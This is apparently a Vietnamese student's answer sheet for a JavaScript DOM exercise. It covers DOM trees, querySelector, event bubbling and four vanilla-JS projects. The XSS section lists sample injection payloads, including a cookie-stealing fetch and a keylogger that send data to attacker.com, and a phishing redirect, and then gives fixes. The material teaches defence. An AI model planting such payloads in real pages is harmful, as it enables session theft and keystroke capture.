# PHẦN A — KIỂM TRA ĐỌC HIỂU (15 điểm)

## Câu A1 (5đ) — DOM Tree

### 1. Vẽ DOM tree cho HTML:

```
#document
└── #app (div#app)
    ├── header
    │   ├── h1
    │   │   └── "Todo App" (text)
    │   └── nav
    │       ├── a.active
    │       │   └── "All" (text)
    │       ├── a
    │       │   └── "Active" (text)
    │       └── a
    │           └── "Completed" (text)
    └── main
        ├── form#todoForm
        │   ├── input#todoInput
        │   └── button
        │       └── "Add" (text)
        └── ul#todoList
            ├── li.todo-item
            │   └── "Learn HTML" (text)
            └── li.todo-item.completed
                └── "Learn CSS" (text)
```

### 2. querySelector cho mỗi yêu cầu:

| Yêu cầu | querySelector |
|---------|--------------|
| Chọn thẻ `<h1>` | `document.querySelector("h1")` |
| Chọn input trong form | `document.querySelector("#todoForm input")` hoặc `document.querySelector("#todoInput")` |
| Chọn tất cả .todo-item | `document.querySelectorAll(".todo-item")` |
| Chọn link đang active | `document.querySelector("a.active")` hoặc `document.querySelector("nav a.active")` |
| Chọn `<li>` đầu tiên trong #todoList | `document.querySelector("#todoList li")` hoặc `document.querySelector("#todoList .todo-item:first-child")` |
| Chọn tất cả `<a>` bên trong `<nav>` | `document.querySelectorAll("nav a")` |

---

## Câu A2 (5đ) — innerHTML vs textContent

### Giải thích sự khác nhau:

| Tính chất | `innerHTML` | `textContent` |
|-----------|-----------|--------------|
| **Tác dụng** | Lấy/gán nội dung HTML (bao gồm tags) | Lấy/gán chỉ text thuần (không tags) |
| **Xử lý HTML** | Phân tích & render HTML tags | Coi HTML tags như text bình thường |
| **Hiệu năng** | Chậm hơn (cần parse HTML) | Nhanh hơn (chỉ text) |
| **Bảo mật** | ⚠️ **Nguy hiểm - XSS** | ✅ **An toàn** |

### Ví dụ khi nào dùng mỗi cái:

#### Dùng `innerHTML`:
```javascript
// Khi bạn muốn render HTML code (đã an toàn/kiểm duyệt):
const app = document.querySelector("#app");
app.innerHTML = `
    <h2>Welcome</h2>
    <p>Hello <strong>User</strong></p>
`;
// Output: Welcome | Hello User (với text đậm)
```

#### Dùng `textContent`:
```javascript
// Khi chỉ muốn hiển thị text:
const message = document.querySelector("#message");
message.textContent = "Price: $99.99";
// Output: Price: $99.99
// Không render HTML nếu có

// Khi user nhập vào - luôn dùng textContent
const userComment = document.querySelector("#comment-input").value;
document.querySelector("#display").textContent = userComment;
// Nội dung được display như text thuần, không thực thi HTML
```

### Ví dụ thực tế:

```javascript
const div = document.querySelector("div");

// innerHTML
div.innerHTML = "<b>Bold</b>";  // → Hiển thị: **Bold** (đậm)

// textContent
div.textContent = "<b>Bold</b>"; // → Hiển thị: <b>Bold</b> (như text)
```

---

### 🚨 Câu hỏi bảo mật: XSS Vulnerability

#### Tại sao innerHTML có thể gây lỗ hổng XSS?

**XSS (Cross-Site Scripting)** là tấn công inject code JavaScript độc hại vào trang web.

`innerHTML` **phân tích và thực thi** HTML code → nếu user input chứa script/event, nó sẽ chạy.

#### Ví dụ code minh họa - ĐÃ BÌNH LUẬN:

```javascript
// ⚠️ NGUY HIỂM - Không bao giờ làm thế này:
const userInput = document.querySelector("#search").value;
// Giả sử user nhập: <img src=x onerror="alert('Hacked!')">

document.querySelector("#result").innerHTML = userInput;
// → Trình duyệt sẽ chạy: alert('Hacked!')
// → Attacker có thể: đánh cắp cookies, session, redirect đến trang giả mạo, v.v.
```

#### Cách khác nhau để tấn công:

```javascript
// Hacker có thể nhập vào input:

// 1. Popup alert:
<img src=x onerror="alert('XSS!')">

// 2. Đánh cắp cookies:
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// 3. Thêm keylogger:
<img src=x onerror="document.addEventListener('keydown', (e) => { fetch('http://attacker.com/log?key=' + e.key); })">

// 4. Redirect đến trang giả mạo:
<img src=x onerror="window.location='http://fake-bank.com'">
```

#### ✅ CÁC CÁCH SỬA:

**Cách 1: Dùng textContent thay vì innerHTML**
```javascript
const userInput = document.querySelector("#search").value;
document.querySelector("#result").textContent = userInput;
// ✅ An toàn - HTML tags được coi như text
```

**Cách 2: Escape HTML tags**
```javascript
function escapeHTML(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

const userInput = document.querySelector("#search").value;
const escapedInput = escapeHTML(userInput);
document.querySelector("#result").innerHTML = escapedInput;
// ✅ An toàn - tags bị escape thành text
```

**Cách 3: Sanitize bằng thư viện (Best Practice)**
```javascript
// Dùng DOMPurify hoặc tương tự
const userInput = document.querySelector("#search").value;
const cleanHTML = DOMPurify.sanitize(userInput);
document.querySelector("#result").innerHTML = cleanHTML;
// ✅ An toàn & linh hoạt - cho phép safe HTML, loại bỏ malicious code
```

**Tóm tắt - Best Practices:**
- ✅ Dùng `textContent` cho user input
- ✅ Escape HTML nếu phải dùng `innerHTML`
- ✅ Validate & sanitize dữ liệu trước khi render
- ⚠️ Tránh dùng `innerHTML` với dữ liệu từ user trực tiếp

---

## Câu A3 (5đ) — Event Bubbling

### Hiểu về Event Bubbling:

**Event bubbling** = sự kiện "nổi bọt" từ element bị click lên các element cha.

Thứ tự: `BUTTON` → `INNER` → `OUTER`

### HTML Structure:
```html
<div id="outer">
    <div id="inner">
        <button id="btn">Click me</button>
    </div>
</div>
```

### Scenario 1: Không có `stopPropagation()`

```javascript
document.querySelector("#outer").addEventListener("click", () => {
    console.log("OUTER");
});

document.querySelector("#inner").addEventListener("click", () => {
    console.log("INNER");
});

document.querySelector("#btn").addEventListener("click", (e) => {
    console.log("BUTTON");
    // stopPropagation() commented out
});
```

**Khi click vào button:**

```
Output:
BUTTON
INNER
OUTER
```

**Giải thích:**
1. Button được click → chạy event handler của button → `BUTTON`
2. Event "nổi bọt" lên parent (#inner) → `INNER`
3. Event tiếp tục nổi bọt lên grandfather (#outer) → `OUTER`

---

### Scenario 2: Với `stopPropagation()`

```javascript
document.querySelector("#btn").addEventListener("click", (e) => {
    console.log("BUTTON");
    e.stopPropagation();  // ← uncomment
});
```

**Khi click vào button:**

```
Output:
BUTTON
```

**Giải thích:**
1. Button được click → chạy event handler → `BUTTON`
2. `e.stopPropagation()` dừng sự kiện từ nổi bọt tiếp tục
3. Event không truyền lên parent/grandfather
4. Chỉ in `BUTTON` mà thôi

---

### Bảng so sánh:

| Điều kiện | Output |
|-----------|--------|
| **Bình thường (bubbling)** | `BUTTON` → `INNER` → `OUTER` |
| **Với stopPropagation()** | `BUTTON` (dừng tại đây) |

---

### Các phương thức khác liên quan:

```javascript
event.stopPropagation()      // Ngăn event bubble lên
event.preventDefault()        // Ngăn hành động mặc định (VD: form submit)
event.stopImmediatePropagation() // Ngăn bubble + các listener khác trên element này
```

### Ví dụ thực tế - Event Delegation (sử dụng bubbling):

```javascript
// Cách 1: Thêm listener cho mỗi item (không hiệu quả)
document.querySelectorAll(".item").forEach(item => {
    item.addEventListener("click", () => console.log("Clicked item"));
});

// Cách 2: Thêm listener cho parent (event delegation - tốt hơn)
document.querySelector(".list").addEventListener("click", (e) => {
    if (e.target.matches(".item")) {
        console.log("Clicked item:", e.target.textContent);
    }
});
```

---

## Tóm tắt 15 điểm:

| Câu | Điểm | Nội dung |
|-----|------|---------|
| **A1** | 5đ | DOM tree + querySelector (mỗi 1 đúng = 0.5đ × 10) |
| **A2** | 5đ | innerHTML vs textContent + XSS fix |
| **A3** | 5đ | Event bubbling prediction + stopPropagation |

---

# PHẦN B — THỰC HÀNH CODE (70 điểm)

## 📌 Hướng dẫn chung:
- **Vanilla JavaScript Only** - KHÔNG dùng jQuery, React, Vue, hay bất kỳ framework nào
- **Mỗi project** có folder riêng với: `index.html`, `style.css`, `app.js`
- **Event Delegation** - Gắn listeners trên parent, không trên từng element con
- **DOM Manipulation** - Dùng `createElement` để tạo elements, KHÔNG dùng `innerHTML` cho user-generated content
- **LocalStorage/SessionStorage** - Persist dữ liệu khi cần

---

## Bài B1 (20đ) — Todo App Hoàn Chỉnh ✅

### 📁 Folder: `todo_app/`

**Chức năng bắt buộc:**

✅ **Thêm todo** - Gõ text + Enter hoặc click nút → Todo xuất hiện trong list
✅ **Xóa todo** - Click nút ❌ → Todo biến mất
✅ **Toggle completed** - Click vào text → Gạch ngang (toggle class completed)
✅ **Đếm** - Hiển thị "X items left" (chỉ đếm chưa completed)
✅ **Filter** - 3 nút "All / Active / Completed" → lọc hiển thị
✅ **Clear completed** - Nút xóa tất cả todo đã completed
✅ **Edit todo** - Double-click vào todo → đổi thành input → Enter để save
✅ **LocalStorage** - Lưu todos → Refresh trang vẫn còn

**Features được triển khai:**

```javascript
// ✅ Event Delegation - Bind events lên #todoList
todoList.addEventListener('click', handleTodoListClick);
todoList.addEventListener('dblclick', handleTodoListDblClick);

// ✅ CRUD Operations
- addTodo()              // Create
- toggleTodo(id)         // Update (toggle completed)
- editTodo(id, text)     // Update (edit text)
- deleteTodo(id)         // Delete
- clearCompleted()       // Batch delete

// ✅ Filter & Display
- getFilteredTodos()     // Filter by all/active/completed
- updateStats()          // Update items count

// ✅ Persistence
- saveToLocalStorage()   // Save todos to localStorage
- loadFromLocalStorage() // Load todos on page load
```

**Chấm điểm (20 điểm):**
- 5đ: CRUD operations (Add, Delete, Toggle, Edit)
- 5đ: Filter + Count items left
- 5đ: LocalStorage persistence (save & restore)
- 5đ: Event Delegation + clean code structure

---

## Bài B2 (20đ) — Interactive Product Catalog ✅

### 📁 Folder: `product_catalog/`

**Chức năng bắt buộc:**

✅ **Render products** - Từ array JS → Tạo HTML cards bằng createElement → Append vào DOM
✅ **Search realtime** - Gõ vào ô search → Lọc sản phẩm ngay lập tức (dùng event input)
✅ **Filter by category** - Click buttons category → Chỉ hiển thị category đó
✅ **Sort** - Dropdown sort by: Giá tăng, Giá giảm, Tên A-Z, Đánh giá cao nhất
✅ **Card click → Modal** - Click sản phẩm → Hiện modal chi tiết (tạo modal bằng JS)
✅ **Add to cart badge** - Click "Thêm giỏ" → Icon giỏ hàng góc phải hiện badge số lượng
✅ **Dark mode toggle** - Nút toggle dark/light mode (thêm/xóa class dark-mode trên body)

**Product Data Structure:**

```javascript
const products = [
    { 
        id: 1, 
        name: "iPhone 16 Pro Max", 
        price: 29990000, 
        category: "phone", 
        image: "url", 
        rating: 4.8, 
        inStock: true, 
        description: "..." 
    },
    // ... 15+ products (4 categories: phone, tablet, laptop, accessory)
];
```

**Features được triển khai:**

```javascript
// ✅ 100% render bằng JavaScript
- createProductCard(product)  // Tạo DOM element từ product object
- render()                    // Render all visible products

// ✅ Tách functions rõ ràng
- searchProducts(query)       // Real-time search
- filterByCategory(category)  // Category filter
- sortProducts()              // Sort by multiple criteria

// ✅ Modal Management
- openProductModal(id)        // Show product details
- closeModal()                // Close modal
- addToCart()                 // Add to cart & update badge

// ✅ Dark Mode
- toggleDarkMode()            // Toggle dark mode class
- loadDarkMode()              // Load from localStorage
```

**Chấm điểm (20 điểm):**
- 4đ: Render products from JS array
- 4đ: Search + Filter functionality
- 4đ: Sort options (6 sort criteria)
- 4đ: Modal + Cart badge
- 4đ: Dark mode + responsive design

---

## Bài B3 (15đ) — Form Validator ✅

### 📁 Folder: `form_validator/`

**Chức năng bắt buộc:**

✅ **Full Name** - 2-50 ký tự → ✅/❌ icon hiển thị real-time
✅ **Email** - Regex validate → Thông báo lỗi cụ thể
✅ **Password strength meter** - 
   - Yếu (đỏ): < 8 ký tự
   - Trung bình (vàng): 8+ ký tự, có chữ + số
   - Mạnh (xanh): 8+ ký tự, có chữ hoa + thường + số + ký tự đặc biệt
   - Thanh progress bar đổi màu theo strength
✅ **Confirm password** - Real-time check khớp với password
✅ **Phone** - 10 chữ số → Tự thêm dấu gạch: 0901-234-567
✅ **Submit button** - Disabled cho đến khi tất cả fields valid
✅ **Success modal** - Khi submit, hiện modal "Đăng ký thành công!" với thông tin đã nhập

**Validation Rules:**

```javascript
// Name validation
- Length: 2-50 characters
- Required: Yes

// Email validation
- Regex: /^[^\s@]+@[^\s@]+\.[^\s@]+$/
- Required: Yes

// Password strength
const requirements = [
    { regex: /.{8,}/, description: "8+ characters" },
    { regex: /[A-Z]/, description: "Uppercase letter" },
    { regex: /[a-z]/, description: "Lowercase letter" },
    { regex: /\d/, description: "Number" },
    { regex: /[!@#$%^&*...]/, description: "Special character" }
];
// Strength levels: weak (<3), medium (3-4), strong (5)

// Phone formatting
- Input: "0901234567" → Display: "0901-234-567"
- Auto-format as user types
```

**Features được triển khai:**

```javascript
// ✅ Real-time validation
- validateFullName()
- validateEmail()
- validatePassword()      // + strength meter
- validateConfirmPassword()
- validatePhone()         // + auto-formatting

// ✅ UI Updates
- showSuccess(input)      // Green checkmark
- showError(input, msg)   // Red X + error message
- updateStrengthMeter()   // Color-coded bar

// ✅ Form Control
- updateSubmitButton()    // Enable/disable based on validation
- handleSubmit()          // Show success modal
```

**Chấm điểm (15 điểm):**
- 3đ: Name, Email, Phone validation
- 3đ: Password strength meter
- 3đ: Real-time validation + UI feedback
- 3đ: Confirm password + auto-formatting
- 3đ: Submit button control + success modal

---

## Bài B4 (15đ) — Keyboard Shortcuts & Accessibility ✅

### 📁 Folder: `keyboard_app/`

**Chức năng bắt buộc:**

#### Gallery ảnh:
✅ **Mũi tên ← →** - Chuyển ảnh trước/sau
✅ **Số 1-9** - Nhảy đến ảnh tương ứng
✅ **Space** - Play/pause slideshow tự động
✅ **Escape** - Đóng modal

#### Command Palette:
✅ **Ctrl+K** - Mở ô tìm kiếm overlay (giống VS Code)
✅ **Gõ keyword** - Hiện danh sách commands
✅ **Enter** - Chọn command
✅ **Escape** - Đóng palette

#### Focus Management:
✅ **Tab** - Di chuyển qua các elements
✅ **Focus ring visible** - Các interactive elements có border focus rõ
✅ **ARIA labels** - Screen reader support
✅ **Live regions** - Thông báo tự động cho screen reader

**Keyboard Shortcuts:**

```javascript
// Gallery Navigation
← / →        → Previous/Next image
1-6          → Jump to image #
Space        → Play/Pause slideshow
Escape       → Close modals

// Command Palette
Ctrl+K       → Open command palette
↑/↓          → Select command
Enter        → Execute command
Escape       → Close palette

// General
Tab          → Focus next element
Shift+Tab    → Focus previous
```

**Features được triển khai:**

```javascript
// ✅ Keyboard Event Handling
- Arrow keys (←→) → Gallery navigation
- Number keys (1-6) → Jump to image
- Space → Play/pause
- Ctrl+K → Command palette
- Escape → Close modals
- Tab → Focus management

// ✅ Command Palette
- filterCommands(query)    // Search commands
- renderCommands(cmds)     // Render command list
- executeCommand(cmd)      // Execute selected

// ✅ Gallery
- nextImage(), prevImage()
- playSlideshow(), pauseSlideshow()
- updateGalleryDisplay()

// ✅ Accessibility
- announceChange(msg)      // Live region announcement
- Focus indicators        // Visible focus ring (3px outline)
- ARIA labels             // On all buttons
- aria-live regions       // For status updates
```

**Accessibility Features:**

| Feature | Implementation |
|---------|------------------|
| Focus Ring | 3px solid outline on all interactive elements |
| ARIA Labels | `aria-label` on buttons: "Previous image", "Play slideshow" |
| Live Regions | `aria-live="polite"` for status updates |
| Keyboard Shortcuts | Full keyboard navigation supported |
| Focus Management | Focus stays within modals (tab trap) |
| Screen Reader | All interactive elements announced |

**Chấm điểm (15 điểm):**
- 3đ: Keyboard shortcuts (arrow keys, number keys, space)
- 3đ: Command palette (Ctrl+K, search, execute)
- 3đ: Focus management + focus rings
- 3đ: ARIA labels + live regions
- 3đ: User experience + accessibility best practices

---

## 📊 Tóm tắt PHẦN B (70 điểm):

| Bài | Folder | Điểm | Chức năng chính |
|-----|--------|------|-----------------|
| **B1** | `todo_app/` | 20đ | CRUD, Filter, LocalStorage, Event Delegation |
| **B2** | `product_catalog/` | 20đ | Search, Filter, Sort, Modal, Cart, Dark Mode |
| **B3** | `form_validator/` | 15đ | Real-time Validation, Password Strength, Auto-format |
| **B4** | `keyboard_app/` | 15đ | Keyboard Shortcuts, Command Palette, Accessibility |

---

## ✅ Checklist hoàn thành:

- [x] B1: Todo App (HTML, CSS, JS) - Event delegation, LocalStorage
- [x] B2: Product Catalog (HTML, CSS, JS) - Dynamic render, Dark mode
- [x] B3: Form Validator (HTML, CSS, JS) - Real-time validation
- [x] B4: Keyboard App (HTML, CSS, JS) - Accessibility, Keyboard shortcuts

---

## 🚀 Cách chạy từng project:

Mở file `index.html` bằng browser hoặc Live Server trong VS Code:

```bash
# VS Code Live Server
Right-click index.html → "Open with Live Server"

# Hoặc double-click index.html
```

Mỗi project hoàn toàn độc lập, không cần install dependencies (Vanilla JavaScript).
